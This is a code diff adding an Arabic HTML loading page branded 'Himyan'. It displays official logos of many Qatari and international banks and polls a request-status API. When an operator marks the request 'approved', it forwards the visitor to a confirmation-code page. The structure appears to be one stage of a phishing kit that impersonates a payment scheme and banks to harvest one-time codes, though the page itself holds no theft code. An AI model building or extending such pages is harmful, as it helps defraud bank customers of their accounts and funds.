@@ -1,0 +1,165 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Himyan</title>
+  <style>
+    :root { color-scheme: light; }
+    *, *::before, *::after { box-sizing: border-box; }
+    html, body { width: 100%; min-height: 100%; margin: 0; }
+    body {
+      min-height: 100vh;
+      overflow: hidden;
+      background: #fff;
+      font-family: Arial, sans-serif;
+    }
+    .loading-screen {
+      position: fixed;
+      inset: 0;
+      display: grid;
+      place-items: center;
+      background: #fff;
+    }
+    .loading-mark {
+      position: relative;
+      display: grid;
+      place-items: center;
+      width: min(76vw, 300px);
+      aspect-ratio: 1;
+    }
+    .loading-mark::before {
+      content: "";
+      position: absolute;
+      inset: 0;
+      border: 4px solid #eee7e9;
+      border-top-color: #86183c;
+      border-right-color: #86183c;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+    .loading-logos {
+      position: relative;
+      z-index: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: clamp(14px, 5vw, 26px);
+      width: 78%;
+      min-height: 86px;
+      padding: 14px;
+      background: #fff;
+    }
+    .loading-logo {
+      display: block;
+      width: clamp(78px, 22vw, 122px);
+      height: clamp(54px, 16vw, 88px);
+      object-fit: contain;
+    }
+    .loading-logo.bank-logo { width: clamp(58px, 18vw, 100px); }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    @media (prefers-reduced-motion: reduce) {
+      .loading-mark::before { animation-duration: 2.5s; }
+    }
+  </style>
+</head>
+<body>
+  <main class="loading-screen" aria-label="Loading">
+    <div class="loading-mark" aria-hidden="true">
+      <div class="loading-logos">
+        <img class="loading-logo" src="assets/logo.svg" alt="" />
+        <img class="loading-logo bank-logo" id="selected-bank-logo" src="assets/bank-logos/bank-logo-default.svg" alt="" />
+      </div>
+    </div>
+  </main>
+  <script>
+    const params = new URLSearchParams(window.location.search);
+    const requestId = params.get('requestId') || localStorage.getItem('himyan-request-id') || '';
+    const stage = params.get('stage') === 'code' ? 'code' : 'initial';
+    const selectedBank = (() => {
+      try { return JSON.parse(localStorage.getItem('himyan-selected-bank') || '{}'); } catch { return {}; }
+    })();
+    const bankCode = params.get('bank') || selectedBank.code || '';
+    const bankLogoFiles = {
+      qnb: 'assets/official-bank-logos/official-bank-logo-qnb.png',
+      cbq: 'assets/official-bank-logos/official-bank-logo-cbq.png',
+      doha: 'assets/official-bank-logos/official-bank-logo-doha.png',
+      ahli: 'assets/official-bank-logos/official-bank-logo-ahli.png',
+      qib: 'assets/official-bank-logos/official-bank-logo-qib.png',
+      rayan: 'assets/official-bank-logos/official-bank-logo-rayan.png',
+      qiib: 'assets/official-bank-logos/official-bank-logo-qiib.png',
+      dukhan: 'assets/official-bank-logos/official-bank-logo-dukhan.png',
+      lesha: 'assets/official-bank-logos/official-bank-logo-lesha.png',
+      qdb: 'assets/official-bank-logos/official-bank-logo-qdb.png',
+      hsbc: 'assets/official-bank-logos/official-bank-logo-hsbc.png',
+      scb: 'assets/official-bank-logos/official-bank-logo-scb.png',
+      arab: 'assets/official-bank-logos/official-bank-logo-arab.png',
+      mashreq: 'assets/official-bank-logos/official-bank-logo-mashreq.png',
+      citibank: 'assets/official-bank-logos/official-bank-logo-citibank.png',
+      bnpp: 'assets/official-bank-logos/official-bank-logo-bnpp.png',
+      saderat: 'assets/official-bank-logos/official-bank-logo-saderat.png'
+    };
+    const bankLogo = document.querySelector('#selected-bank-logo');
+    bankLogo.src = bankLogoFiles[bankCode] || 'assets/bank-logos/bank-logo-default.svg';
+    bankLogo.onerror = () => { bankLogo.src = 'assets/bank-logos/bank-logo-default.svg'; };
+    let timer;
+    function moveAfterApproval(status) {
+      if (status === 'approved' && stage !== 'code') {
+        clearInterval(timer);
+        const lang = params.get('lang') === 'en' ? 'en' : 'ar';
+        window.location.href = `confirmation-code.html?lang=${lang}&requestId=${encodeURIComponent(requestId)}`;
+      }
+    }
+    async function poll() {
+      if (!requestId) return;
+      try {
+        const response = await fetch(`/api/requests/status?id=${encodeURIComponent(requestId)}`, { cache: 'no-store' });
+        const data = await response.json();
+        if (response.ok && data.ok) moveAfterApproval(data.status);
+      } catch {}
+    }
+    poll();
+    timer = setInterval(poll, 5000);
+  </script>
+</body>
+</html>
+
+
+
+/* Bank logo polish for the loading screen. */
+.loading-logos {
+  width: min(86%, 286px);
+  min-height: 104px;
+  padding: 16px 14px;
+  gap: 14px;
+  border: 1px solid #eee7e9;
+  border-radius: 16px;
+  box-shadow: 0 8px 24px rgba(65,20,35,.08);
+}
+.loading-logo {
+  width: 112px;
+  height: 58px;
+  max-width: 112px;
+  max-height: 58px;
+  object-fit: contain;
+  object-position: center;
+}
+.loading-logo.bank-logo {
+  width: 104px;
+  height: 58px;
+  padding: 7px 10px;
+  border: 1px solid #eadfe3;
+  border-radius: 9px;
+  background: #fff;
+  box-shadow: 0 2px 8px rgba(65,20,35,.07);
+}
+@media (max-width: 760px) {
+  .loading-logos { width: min(88%, 270px); min-height: 92px; padding: 12px 10px; gap: 9px; }
+  .loading-logo { width: 96px; height: 50px; max-width: 96px; max-height: 50px; }
+  .loading-logo.bank-logo { width: 88px; height: 50px; padding: 6px 7px; }
+}
+@media (max-width: 380px) {
+  .loading-logos { width: min(92%, 244px); gap: 6px; padding-inline: 8px; }
+  .loading-logo { width: 86px; max-width: 86px; }
+  .loading-logo.bank-logo { width: 78px; max-width: 78px; }
+}
